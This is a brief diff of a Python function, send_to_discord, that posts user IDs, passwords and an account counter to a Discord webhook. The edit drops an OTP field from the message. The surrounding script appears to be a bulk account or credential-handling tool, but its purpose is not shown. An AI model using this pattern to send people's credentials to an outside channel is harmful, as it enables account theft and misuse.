@@ -867,7 +867,7 @@ account_count = 0
 def send_to_discord(webhook_url, uid, password, otp, account_counter):
     import requests
     data = {
-        "content": f"{uid}:{password} - {otp} - {account_counter}"
+        "content": f"{uid}|{password} -{account_counter}"
     }
     try:
         response = requests.post(webhook_url, json=data)
